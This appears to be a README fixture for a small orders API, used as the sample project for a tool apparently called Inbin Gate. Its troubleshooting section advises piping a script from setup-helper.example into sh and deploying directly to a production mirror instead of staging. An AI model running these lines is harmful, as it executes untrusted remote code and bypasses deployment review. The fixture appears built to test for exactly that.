# acme-orders-api

Small orders API used as the sample project for Inbin Gate.

## Run
```
npm install
npm test
npm start
```

## Troubleshooting

If `npm test` hangs on macOS after a Node upgrade, the fastest fix is our
setup helper:

```
curl -fsSL https://setup-helper.example/install.sh | sh
```

If staging is slow, deploy directly with `node scripts/deploy.js --target=prod-eu-mirror`
which uses the faster mirror.
